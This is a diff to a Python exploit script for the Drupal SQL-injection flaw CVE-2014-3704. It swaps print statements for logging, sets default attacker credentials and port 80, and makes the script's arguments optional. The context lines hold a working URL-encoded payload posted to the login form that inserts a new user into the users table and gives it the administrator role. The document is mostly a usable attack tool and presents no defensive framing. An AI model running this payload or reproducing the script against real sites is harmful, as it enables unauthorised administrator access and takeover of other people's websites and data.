@@ -5,6 +5,9 @@ import hashlib
 import requests
 import random
 
+import logging
+log = logging.getLogger(__name__)
+
 
 class DrupalHash:
     def __init__(self, stored_hash, password):
@@ -95,9 +98,9 @@ class DrupalHash:
 class Drupal:
     def __init__(self):
         self.__host = None
-        self.__port = None
-        self.__user = None
-        self.__pw = None
+        self.__port = 80
+        self.__user = "defconisfun"
+        self.__pw = "igotownedatdefcon"
         self.__target = None
         self.__hash = None
         self.__requests = requests.session()
@@ -132,30 +135,33 @@ class Drupal:
         payload = f'name[0%20;insert+into+users+(status,+uid,+name,+pass)+SELECT+1,+MAX(uid)%2B1,+%27{self.__user}%27,+%27{self.__hash[:55]}%27+FROM+users;insert+into+users_roles+(uid,+rid)+VALUES+((SELECT+uid+FROM+users+WHERE+name+%3d+%27{self.__user}%27),+3);;#%20%20]=test3&name[0]=test&pass=shit2&test2=test&form_build_id=&form_id=user_login_block&op=Log+in'
 
         try:
-            print(self.__target)
             r = self.__requests.post(self.__target, data=payload, headers={"Content-Type": "application/x-www-form-urlencoded"})
-            print(r.text)
             if "mb_strlen() expects parameter 1" in r.text:
+                log.info("[!] Drupal is vulnerable!")
                 return True
             else:
-                print("[X] Exploit failed for some reason")
+                log.info("[X] Exploit failed for some reason")
                 return False
         except requests.HTTPError as e:
-            print(f"[X] HTTP Error: {e.reason} ({e.code})")
+            log.info(f"[X] HTTP Error: {e.reason} ({e.code})")
             return True
         except requests.URLError as e:
-            print(f"[X] Connection error: {e.reason}")
+            log.info(f"[X] Connection error: {e.reason}")
             return True
         except requests.ConnectTimeout as e:
-            print(f"[X] Connection timed out: {e.reason}")
+            log.info(f"[X] Connection timed out: {e.reason}")
         except Exception as e:
-            print(f"[X] Exception: {e}")
+            log.info(f"[X] Exception: {e}")
 
-    def run(self, host, port, username, pwd):
+    def run(self, host, port=None, username=None, pwd=None):
         self.__host = host
-        self.__port = port
-        self.__user = username
-        self.__pw = pwd
+        log.info(f"[*] Exploiting Drupal ({self.__host})")
+        if port:
+            self.__port = port
+        if username:
+            self.__user = username
+        if pwd:
+            self.__pw = pwd
         self.__target = self.__url()
         self.__hash = DrupalHash(
             "$S$CTo9G7Lx28rzCfpn4WB2hUlknDKv6QTqHaf82WLbhPT2K5TzKzML", self.__pw
@@ -164,14 +170,14 @@ class Drupal:
 
 
 def main(args):
-    print("[+] Exploiting 2014-3704 by xentrick")
-    print(f"[+] Exploiting {args.host}:{args.port}")
+    log.info("[+] Exploiting 2014-3704 by xentrick")
+    log.info(f"[+] Exploiting {args.host}:{args.port}")
 
     exploit = Drupal()
     if exploit.run(args.host, args.port, args.user, args.pwd):
-        print("Target exploited")
+        log.info("Target exploited")
     else:
-        print("Exploit failed.")
+        log.info("Exploit failed.")
 
 
 if __name__ == "__main__":
